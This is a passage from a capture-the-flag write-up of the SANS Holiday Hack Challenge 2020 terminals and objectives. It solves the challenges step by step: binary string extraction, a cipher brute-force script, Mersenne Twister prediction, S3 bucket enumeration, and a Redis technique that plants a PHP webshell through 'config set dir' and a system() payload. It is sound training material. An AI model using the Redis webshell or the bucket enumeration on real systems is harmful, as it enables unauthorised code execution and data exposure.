<span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">munch0</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
</code></pre></div><p><code>getKeyByValue</code> is from <a href="https://stackoverflow.com/questions/9907419/how-to-get-a-key-in-a-javascript-object-by-its-value">https://stackoverflow.com/questions/9907419/how-to-get-a-key-in-a-javascript-object-by-its-value</a></p>
<p><img src="img/image-20210110110001217.png" alt="image-20210110110001217"></p>
<h2 id="terminal-speaker-unprep-bushy-evergreen">Terminal Speaker UNprep (Bushy Evergreen)</h2>
<p>Description:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Help us get into the Speaker Unpreparedness Room!
The door is controlled by ./door, but it needs a password! If you can figure
out the password, it&#39;ll open the door right up!
Oh, and if you have extra time, maybe you can turn on the lights with ./lights
activate the vending machines with ./vending-machines? Those are a little
trickier, they have configuration files, but it&#39;d help us a lot!
(You can do one now and come back to do the others later if you want)
We copied edit-able versions of everything into the ./lab/ folder, in case you
want to try EDITING or REMOVING the configuration files to see how the binaries
react.
Note: These don&#39;t require low-level reverse engineering, so you can put away IDA
and Ghidra (unless you WANT to use them!)
</code></pre></div><p>Hints:</p>
<blockquote>
<p>Strings in Binary Files
From: Bushy Evergreen
The strings command is common in Linux and available in Windows as part of SysInternals.</p>
<p>Letting a Program Decrypt for You
From: Bushy Evergreen
While you have to use the lights program in /home/elf/ to turn the lights on, you can delete parts in /home/elf/lab/.</p>
<p>Lookup Table
From: Bushy Evergreen
For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day.</p>
</blockquote>
<p>Bushy Evergreen:</p>
<blockquote>
<p>Ohai! Bushy Evergreen, just trying to get this door open.
It&rsquo;s running some Rust code written by Alabaster Snowball.
I&rsquo;m pretty sure the password I need for ./door is right in the executable itself.
Isn&rsquo;t there a way to view the human-readable strings in a binary file?</p>
</blockquote>
<blockquote>
<p>That&rsquo;s it! What a great password&hellip;
Oh, this might be a good time to mention another lock in the castle.
Santa asked me to ask you to evaluate the security of our new HID lock.
If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it.
It&rsquo;s a slick device that can read others' badges!
Hey, you want to help me figure out the light switch too? Those come in handy sometimes.
The password we need is in the lights.conf file, but it seems to be encrypted.
There&rsquo;s another instance of the program and configuration in ~/lab/ you can play around with.
What if we set the user name to an encrypted value?</p>
</blockquote>
<blockquote>
<p>Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess!
Oh, did I mention that the Proxmark can simulate badges? Cool, huh?
There are lots of references online to help.
In fact, there&rsquo;s <a href="https://www.youtube.com/watch?v=647U85Phxgo">a talk</a> going on right now!
So hey, if you want, there&rsquo;s one more challenge.
You see, there&rsquo;s a vending machine in there that the speakers like to use sometimes.
Play around with ./vending_machines in the lab folder.
You know what might be worth trying? Delete or rename the config file and run it.
Then you could set the password yourself to AAAAAAAA or BBBBBBBB.
If the encryption is simple code book or rotation ciphers, you&rsquo;ll be able to roll back the original password.</p>
</blockquote>
<h3 id="door">Door</h3>
<p>Testing:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@7cf6a39fae81 ~ $ ./door
You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There&#39;s gotta be a tool for this...
What do you enter? &gt; password
Checking......
Beep boop invalid password
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@7cf6a39fae81 ~ $ strings door | less
</code></pre></div><p>Then look for the string &ldquo;What do&rdquo;</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">What do you enter? &gt;
opendoor
 (bytes Overflowextern &#34;
NulErrorBox&lt;Any&gt;thread &#39;expected, found Door opened!
That would have opened the door!
Be sure to finish the challenge in prod: And don&#39;t forget, the password is &#34;Op3nTheD00r&#34;
Beep boop invalid password
</code></pre></div><p>We&rsquo;ve got the password now:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@7cf6a39fae81 ~ $ ./door
You look at the screen. It wants a password. You roll your eyes - the
password is probably stored right in the binary. There&#39;s gotta be a
tool for this...
What do you enter? &gt; Op3nTheD00r
Checking......
Door opened!
</code></pre></div><p>Answer: <code>Op3nTheD00r</code></p>
<h3 id="lights">Lights</h3>
<p>Next, the lights ~~</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@8163dac166e1 ~ $ ./lights
The speaker unpreparedness room sure is dark, you&#39;re thinking (assuming you&#39;ve opened the door; otherwise, you wonder how dark it actually is)
You wonder how to turn the lights on? If only you had some kind of hin---
 &gt;&gt;&gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf
---t to help figure out the password... I guess you&#39;ll just have to make do!
The terminal just blinks: Welcome back, elf-technician
What do you enter? &gt; password
Checking......
Beep boop invalid password
</code></pre></div><p>Let&rsquo;s have a look at the config file in the <code>lab</code> directory:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@8163dac166e1 ~/lab $ cat lights.conf
password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
name: elf-technician
</code></pre></div><p>That&rsquo;s some encrypted password right there&hellip; Following the hint from Bushy, let&rsquo;s try using the password as username:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@8163dac166e1 ~/lab $ cat lights.conf
password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@8163dac166e1 ~/lab $ ./lights
The speaker unpreparedness room sure is dark, you&#39;re thinking (assuming
you&#39;ve opened the door; otherwise, you wonder how dark it actually is)
You wonder how to turn the lights on? If only you had some kind of hin---
 &gt;&gt;&gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf
---t to help figure out the password... I guess you&#39;ll just have to make do!
The terminal just blinks: Welcome back, Computer-TurnLightsOn
What do you enter? &gt; beep
Checking......
Beep boop invalid password
</code></pre></div><p>Hey look, it seems the password we gave as username was decrypted! <code>Welcome back, Computer-TurnLightsOn</code>.</p>
<p>Let&rsquo;s go turn on the lights /o/</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@8163dac166e1 ~/lab $ ~/lights
The speaker unpreparedness room sure is dark, you&#39;re thinking (assuming
you&#39;ve opened the door; otherwise, you wonder how dark it actually is)
You wonder how to turn the lights on? If only you had some kind of hin---
 &gt;&gt;&gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf
---t to help figure out the password... I guess you&#39;ll just have to make do!
The terminal just blinks: Welcome back, elf-technician
What do you enter? &gt; Computer-TurnLightsOn
Checking......
Lights on!
</code></pre></div><h3 id="vending-machines">Vending Machines</h3>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@4c81c53b56ad ~ $ ./vending-machines
The elves are hungry!
If the door&#39;s still closed or the lights are still off, you know because
you can hear them complaining about the turned-off vending machines!
You can probably make some friends if you can get them back on...
Loading configuration from: /home/elf/vending-machines.json
I wonder what would happen if it couldn&#39;t find its config file? Maybe that&#39;s
something you could figure out in the lab...
Welcome, elf-maintenance! It looks like you want to turn the vending machines back on?
Please enter the vending-machine-back-on code &gt; 1234
Checking......
Beep boop invalid password
</code></pre></div><p>Okay, let&rsquo;s have a look at the configuration file with <code>cat lab/vending-machines.json</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;elf-maintenance&#34;</span><span class="p">,</span>
  <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;LVEdQPpBwr&#34;</span>
<span class="p">}</span>
</code></pre></div><p>Like indicated by the hint, let&rsquo;s see what happens if we delete the config file:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@4c81c53b56ad ~/lab $ mv vending-machines.json vending-machines.orig
elf@4c81c53b56ad ~/lab $ ./vending-machines
The elves are hungry!
If the door&#39;s still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on...
Loading configuration from: /home/elf/lab/vending-machines.json
I wonder what would happen if it couldn&#39;t find its config file? Maybe that&#39;s something you could figure out in the lab...
ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated!
Please enter the name &gt; elf-maintenance
Please enter the password &gt; 1234
Welcome, elf-maintenance! It looks like you want to turn the vending machines back on?
Please enter the vending-machine-back-on code &gt; 1234
Checking......
That would have enabled the vending machines!
If you have the real password, be sure to run /home/elf/vending-machines
elf@4c81c53b56ad ~/lab $ ls
door  lights  lights.conf  vending-machines  vending-machines.orig  vending-machines.json
elf@4c81c53b56ad ~/lab $ cat vending-machines.json
{
  &#34;name&#34;: &#34;elf-maintenance&#34;,
  &#34;password&#34;: &#34;2W1h&#34;
}
</code></pre></div><p>We can setup the password and observe how it was encoded! Let&rsquo;s try a bunch of them to try to understand how the algorithm works:</p>
<table>
<thead>
<tr>
<th>iinput</th>
<th>encoded password in the json</th>
</tr>
</thead>
<tbody>
<tr>
<td>1234</td>
<td>2W1h</td>
</tr>
<tr>
<td>1111</td>
<td>2rDO</td>
</tr>
<tr>
<td>1114</td>
<td>2rDh</td>
</tr>
<tr>
<td>AAAAAAAAAA</td>
<td>XiGRehmwXi</td>
</tr>
<tr>
<td>BBBBBBBBBB</td>
<td>DqTpKv7fDq</td>
</tr>
<tr>
<td>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
<td>9UedAffhM83WsX4LYNPCwn2EiaGpUuCOSBa41bdZxdyHV0HpBPKo</td>
</tr>
</tbody>
</table>
<p>From the results, we can deduce that:</p>
<ul>
<li>a character at the same position is always encoded the same way: a &lsquo;1&rsquo; as first character will always be encoded as <code>2</code></li>
<li>it&rsquo;s not a simple substitution cipher as it seems to depends on the position: a <code>1</code> at index 0 will be encoded as <code>1</code> but a <code>1</code> at position 1 will be encoded as <code>r</code></li>
<li>the number of characters doesn&rsquo;t change so the password is 10 characters</li>
</ul>
<p>Like indicated by the hint, the technique we can try is the following:</p>
<ul>
<li>we know the encoded password is <code>LVEdQPpBwr</code></li>
<li>delete the config file so that we can setup a new password <code>a</code></li>
<li>compare the encoded password generated in the config file to see if the result is <code>L</code></li>
<li>if not, repeat the process with the password <code>b</code> until we get the first letter of the password</li>
</ul>
<p>I wrote a semi-automated bruteforce script to do that, it only bruteforce one letter and not the whole password, so you have to run it 10 times and update the input password and the target password with each new found letter:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span><span class="nv">charset</span><span class="o">=({</span>a..z<span class="o">}</span> <span class="o">{</span>A..Z<span class="o">}</span> <span class="o">{</span>0..9<span class="o">})</span>
<span class="k">for</span> i in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">charset</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
    rm -f vending-machines.json
    ./vending-machines &gt; /dev/null <span class="s">&lt;&lt;EOF
</span><span class="s">CandyCane$i
</span><span class="s">CandyCane$i
</span><span class="s">CandyCane$i
</span><span class="s">EOF</span>
    <span class="nv">password</span><span class="o">=</span><span class="k">$(</span>cat vending-machines.json <span class="p">|</span> grep password <span class="p">|</span> cut -d<span class="s1">&#39;&#34;&#39;</span> -f4<span class="k">)</span>
    <span class="c1"># target password: LVEdQPpBwr</span>
    <span class="k">if</span> <span class="o">[</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">&#34;LVEdQPpBwr&#34;</span> <span class="o">]</span> <span class="p">;</span>
    <span class="k">then</span>
        <span class="nb">echo</span> <span class="s2">&#34;####&#34;</span> <span class="nv">$i</span> <span class="s2">&#34;for password&#34;</span> <span class="nv">$password</span>
        <span class="nb">exit</span> <span class="m">0</span>
    <span class="k">else</span>
        <span class="nb">echo</span> <span class="s2">&#34;trying&#34;</span> <span class="nv">$i</span>
    <span class="k">fi</span>
 <span class="k">done</span>
</code></pre></div><p>It&rsquo;s not fast but you get the flag in the end :&lsquo;DDD</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@713b531bca8d ~ $ ./vending-machines
The elves are hungry!
If the door&#39;s still closed or the lights are still off, you know because
you can hear them complaining about the turned-off vending machines!
You can probably make some friends if you can get them back on...
Loading configuration from: /home/elf/vending-machines.json
I wonder what would happen if it couldn&#39;t find its config file? Maybe that&#39;s
something you could figure out in the lab...
Welcome, elf-maintenance! It looks like you want to turn the vending machines back on?
Please enter the vending-machine-back-on code &gt; CandyCane1
Checking......
Vending machines enabled!!
</code></pre></div><p>Answer: <code>CandyCane1</code></p>
<h2 id="terminal-redis-bug-hunt-holly-evergreen">Terminal Redis Bug Hunt (Holly Evergreen)</h2>
<p>Description</p>
<blockquote>
<p>We need your help!!
The server stopped working, all that&rsquo;s left is the maintenance port.
To access it, run:
curl http://localhost/maintenance.php
We&rsquo;re pretty sure the bug is in the index page. Can you somehow use the
maintenance page to view the source code for the index page?</p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>Redis RCE
From: Holly Evergreen
<a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">This</a> is kind of what we&rsquo;re trying to do&hellip;</p>
</blockquote>
<h3 id="solution">Solution</h3>
<p>Starting from the index page:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">player@8e844370649e:~$ curl http://localhost/index.php
Something is wrong with this page! Please use http://localhost/maintenance.php to see if y
ou can figure out what&#39;s going onplayer@8e844370649e:~$
</code></pre></div><p>Trying the maintenance page:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">player@3a7f1f335670:~$ curl http://localhost/maintenance.php
ERROR: &#39;cmd&#39; argument required (use commas to separate commands); eg:
curl http://localhost/maintenance.php?cmd=help
curl http://localhost/maintenance.php?cmd=mget,example1
player@3a7f1f335670:~$
</code></pre></div><p>huh, let&rsquo;s try help then?</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">player@3a7f1f335670:~$ curl http://localhost/maintenance.php?cmd=help
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;help&#39;
redis-cli 5.0.3
To get help about Redis commands type:
      &#34;help @&lt;group&gt;&#34; to get a list of commands in &lt;group&gt;
      &#34;help &lt;command&gt;&#34; for help on &lt;command&gt;
      &#34;help &lt;tab&gt;&#34; to get a list of possible help topics
      &#34;quit&#34; to exit
To set redis-cli preferences:
      &#34;:set hints&#34; enable online hints
      &#34;:set nohints&#34; disable online hints
Set your preferences in ~/.redisclirc
</code></pre></div><p>Our commands are passed to redis-cli. Interesting. Let&rsquo;s try other redis command to get more information:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">player@8e844370649e:~$ curl http://localhost/maintenance.php?cmd=info
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;info&#39;
# Server
redis_version:5.0.3
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:1b271fe49834c463
redis_mode:standalone
os:Linux 4.19.0-13-cloud-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:6
run_id:ff5156743149ae1be23533352f949293ba79cc13
tcp_port:6379
uptime_in_seconds:8
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:14700728
executable:/usr/bin/redis-server
config_file:/usr/local/etc/redis/redis.conf
# Clients
connected_clients:1
client_recent_max_input_buffer:0
client_recent_max_output_buffer:0
blocked_clients:0
# Memory
used_memory:858912
used_memory_human:838.78K
used_memory_rss:15298560
used_memory_rss_human:14.59M
used_memory_peak:858912
used_memory_peak_human:838.78K
used_memory_peak_perc:107.90%
used_memory_overhead:845542
used_memory_startup:795736
used_memory_dataset:13370
used_memory_dataset_perc:21.16%
allocator_allocated:1185784
allocator_active:1400832
allocator_resident:6008832
total_system_memory:135198154752
total_system_memory_human:125.91G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.18
allocator_frag_bytes:215048
allocator_rss_ratio:4.29
allocator_frag_bytes:215048
allocator_rss_ratio:4.29
allocator_rss_bytes:4608000
rss_overhead_ratio:2.55
rss_overhead_bytes:9289728
mem_fragmentation_ratio:19.22
mem_fragmentation_bytes:14502544
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0
# Persistence
loading:0
rdb_changes_since_last_save:2
rdb_bgsave_in_progress:0
rdb_last_save_time:1608536240
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
# Stats
total_connections_received:3
total_commands_processed:5
instantaneous_ops_per_sec:0
total_net_input_bytes:235
total_net_output_bytes:25
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
# Replication
role:master
connected_slaves:0
master_replid:081fbf6764d6fbf682990e18ffff4f42cfcc605b
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0
# CPU
used_cpu_sys:0.009580
used_cpu_user:0.011805
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000
# Cluster
cluster_enabled:0
# Keyspace
db0:keys=2,expires=0,avg_ttl=0
</code></pre></div><p>A couple of things to note here:</p>
<ul>
<li>the redis version is 5.0.3</li>
<li>the OS is a Linux 4.19.0-13-cloud-amd64 x86_64</li>
<li>the config file path is <code>/usr/local/etc/redis/redis.conf</code></li>
</ul>
<p>Huh, interesting, do we have access to any redis config file on our machine?</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">player@55d31a4728e2:~$ find / -name &#34;redis.conf&#34; 2&gt;/dev/null
/usr/local/etc/redis/redis.conf
/etc/redis/redis.conf
player@55d31a4728e2:~$ cat /usr/local/etc/redis/redis.conf
cat: /usr/local/etc/redis/redis.conf: Permission denied
player@55d31a4728e2:~$ cat /etc/redis/redis.conf |head
bind 127.0.0.1
requirepass &#34;R3disp@ss&#34;
protected-mode no
port 6379
tcp-backlog 511
timeout 0
tcp-keepalive 300
# !
</code></pre></div><p>And we have the redis password! We can now use the redis-cli directly instead of the command injection (<a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-authentication">how to authenticate on redis</a>)!  Next, it&rsquo;s a direct application of the <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce">redis webshell</a>. The only unknown being the path to the web folder, after some trial and error, it&rsquo;s <code>/var/www/html</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">player@17eeb6771563:~$ redis-cli
127.0.0.1:6379&gt; AUTH R3disp@ss
OK
127.0.0.1:6379&gt; config set dir /var/www/html/
OK
127.0.0.1:6379&gt; config set dbfilename boom.php
OK
127.0.0.1:6379&gt; set test &#34;&lt;?php system(&#39;cat index.php&#39;); ?&gt;&#34;
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt; quit
player@17eeb6771563:~$ curl http://localhost/boom.php -
curl: option -: is unknown
curl: try &#39;curl --help&#39; or &#39;curl --manual&#39; for more information
player@17eeb6771563:~$ curl http://localhost/boom.php
Warning: Binary output can mess up your terminal. Use &#34;--output -&#34; to tell
Warning: curl to output it to your terminal anyway, or consider &#34;--output
Warning: &lt;FILE&gt;&#34; to save to a file.
player@17eeb6771563:~$ curl http://localhost/boom.php --output -
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�f&gt;�_used-mem
 aof-preamble���example2#We think there&#39;s a bug in index.phptest!&lt;?php
# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
#
echo &#34;Something is wrong with this page! Please use http://localhost/maintenance.php to se
e if you can figure out what&#39;s going on&#34;
?&gt;
example1The site is in maintenance mode��Z�\
</code></pre></div><h2 id="arcade-snowball-game-tangle-coalbox">Arcade Snowball Game (Tangle Coalbox)</h2>
<p>Hints:</p>
<blockquote>
<p>PRNG Seeding
From: Tangle Coalbox
While system time is probably most common, developers have the option to seed pseudo-random number generators with other values.</p>
</blockquote>
<blockquote>
<p>Extra Instances
From: Tangle Coalbox
Need extra Snowball Game instances? Pop them up in a new tab from <a href="https://snowball2.kringlecastle.com">https://snowball2.kringlecastle.com</a>.</p>
</blockquote>
<blockquote>
<p>Mersenne Twister
From: Tangle Coalbox
Terminal: Snowball Game
Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might <a href="https://github.com/kmyk/mersenne-twister-predictor/blob/master/readme.md">predict</a> upcoming values.</p>
</blockquote>
<h3 id="solution-1">Solution</h3>
<p>When selecting <code>Impossible</code>, the player name becomes unavailable, but there&rsquo;s a javascript comment with all the discarded player names:</p>
<p><img src="img/image-20210109224928406.png" alt="image-20210109224928406"></p>
<p>Copy-paste the seeds in a file, use some vim-fu to keep only the numbers: <code>:%s/ - Not random enough//g</code>. Then feed this list of numbers to this library <a href="https://github.com/kmyk/mersenne-twister-predictor">https://github.com/kmyk/mersenne-twister-predictor</a> and it will predict the next random number for us, ie the one used by the impossible game we just started.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ cat seeds.txt| mt19937predict &gt; predicted.txt
$ head -n 1 predicted.txt
2222992775
</code></pre></div><p>Next, we start another tab on <a href="https://snowball2.kringlecastle.com/,">https://snowball2.kringlecastle.com/,</a> start a new game on easy with the player name we just found, and play a game to find out the enemies boats. When a boat is found, we can replicate it in the impossible game without making an error, thus beating the computer.</p>
<p><img src="img/image-20210110225114173.png" alt="image-20210110225114173"></p>
<h1 id="objectives">Objectives</h1>
<h2 id="1-uncover-santas-gift-list-">1. Uncover Santa&rsquo;s Gift List 🎄</h2>
<p>Description:</p>
<blockquote>
<p>There is a photo of Santa&rsquo;s Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.</p>
</blockquote>
<p>Hints:</p>
<blockquote>
<p>Image Edit Tool
From: Jingle Ringford
There are <a href="https://www.photopea.com/">tools</a> out there that could help Filter the Distortion that is this Twirl.</p>
</blockquote>
<blockquote>
<p>Twirl Area
From: Jingle Ringford
Make sure you Lasso the correct twirly area.</p>
</blockquote>
<h3 id="solution-2">Solution</h3>
<p>Ohno, Santa&rsquo;s gift list is all twirly!</p>
<p><img src="img/billboard.png" alt="img"></p>
<p>Using an image editor like <a href="https://www.gimp.org/">Gimp</a>, select the twirl with the lasso tool. Some fiddling with the <code>Whirl and pinch</code> settings in the <code>Filters  &gt; Distorts</code> menu should produce a kinda readable image:</p>
<p><img src="img/image-20201219225945181.png" alt="image-20201219225945181"></p>
<p>Not the greatest result, but it&rsquo;s readable and it says <code>Josh Wright - proxmark</code>. And we have our first answer: <code>proxmark</code>.</p>
<h2 id="2-investigate-s3-bucket-">2. Investigate S3 Bucket 🎄</h2>
<p>Objective description:</p>
<blockquote>
<p>When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.</p>
</blockquote>
<p>Hints:</p>
<blockquote>
<p>Find Santa&rsquo;s Package
From: Shinny Upatree
Find Santa&rsquo;s <code>package</code> file from the cloud storage provider. Check Josh Wright&rsquo;s <a href="https://www.youtube.com/watch?v=t4UzXx5JHk0">talk</a> for more tips!</p>
</blockquote>
<blockquote>
<p>Leaky AWS S3 Buckets
From: Shinny Upatree
It seems like there&rsquo;s a new story every week about data exposed through unprotected <a href="https://www.computerweekly.com/news/252491842/Leaky-AWS-S3-bucket-once-again-at-centre-of-data-breach">Amazon S3 buckets</a>.</p>
</blockquote>
<blockquote>
<p>Finding S3 Buckets
From: Shinny Upatree
Robin Wood wrote up a guide about <a href="https://digi.ninja/blog/whats_in_amazons_buckets.php">finding these open S3 buckets</a>.</p>
</blockquote>
<blockquote>
<p>Bucket_finder.rb
From: Shinny Upatree
He even wrote a tool to <a href="https://digi.ninja/projects/bucket_finder.php">search for unprotected buckets</a>!</p>
</blockquote>
<blockquote>
<p>Santa&rsquo;s Wrapper3000
From: Shinny Upatree
Santa&rsquo;s Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages.</p>
</blockquote>
<p>Description:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Can you help me? Santa has been experimenting with new wrapping technology, and we&#39;ve run into a ribbon-curling nightmare!
We store our essential data assets in the cloud, and what a joy it&#39;s been!
Except I don&#39;t remember where, and the Wrapper3000 is on the fritz!

Can you find the missing package, and unwrap it all the way?

Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command.

To see this help again, run cat /etc/motd.
</code></pre></div><h3 id="solution-3">Solution</h3>
<p>We have a <code>wordlist</code> with a few words: <code>kringlecastle</code>, <code>wrapper</code>, <code>santa</code> and a ruby script called <a href="https://digi.ninja/projects/bucket_finder.php">bucket finder</a>. Running <code>./bucket_finder.rb wordlist</code> tests the 3 buckets but returns access denied on all of them.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@f29794ffce44:~/bucket_finder$ ./bucket_finder.rb wordlist
http://s3.amazonaws.com/kringlecastle
Bucket found but access denied: kringlecastle
http://s3.amazonaws.com/wrapper
Bucket found but access denied: wrapper
http://s3.amazonaws.com/santa
Bucket santa redirects to: santa.s3.amazonaws.com
http://santa.s3.amazonaws.com/
        Bucket found but access denied: santa
</code></pre></div><p>But the wordlist doesn&rsquo;t contain the bucket that interest us, modify the wordlist to contain <code>wrapper3000</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@f29794ffce44:~/bucket_finder$ echo &#34;wrapper3000&#34; &gt; wordlist
</code></pre></div><p>and run the script again:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder$ ./bucket_finder.rb wordlist
http://s3.amazonaws.com/wrapper3000
Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )
        &lt;Public&gt; http://s3.amazonaws.com/wrapper3000/package
</code></pre></div><p>The <code>wrapper3000</code> bucket is public! Grab all public files with the <code>download</code> option:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder$ ./bucket_finder.rb --download wordlist
http://s3.amazonaws.com/wrapper3000
Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )
        &lt;Downloaded&gt; http://s3.amazonaws.com/wrapper3000/package
</code></pre></div><p>Let the unwrapping on that <code>package</code> file begin!</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ file package
package: ASCII text, with very long lines
</code></pre></div><p>Looks like the package is base64 encoded! The command <code>base64 </code> with the <code>-d</code> option can decode it:</p>
<div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">elf</span><span class="err">@</span><span class="mf">5e5813</span><span class="nx">d4a97c</span><span class="p">:</span><span class="err">~</span><span class="o">/</span><span class="nx">bucket_finder</span><span class="o">/</span><span class="nx">wrapper3000</span><span class="err">$</span> <span class="nx">cat</span> <span class="kn">package</span> <span class="p">|</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="p">&gt;</span> <span class="kn">package</span><span class="p">.</span><span class="nx">out</span>
<span class="nx">elf</span><span class="err">@</span><span class="mf">5e5813</span><span class="nx">d4a97c</span><span class="p">:</span><span class="err">~</span><span class="o">/</span><span class="nx">bucket_finder</span><span class="o">/</span><span class="nx">wrapper3000</span><span class="err">$</span> <span class="nx">file</span> <span class="kn">package</span><span class="p">.</span><span class="nx">out</span>
<span class="kn">package</span><span class="p">.</span><span class="nx">out</span><span class="p">:</span> <span class="nx">Zip</span> <span class="nx">archive</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">at</span> <span class="nx">least</span> <span class="nx">v1</span><span class="mf">.0</span> <span class="nx">to</span> <span class="nx">extract</span>

</code></pre></div><p>Now we have a zip archive, which we can extract with <code>unzip</code></p>
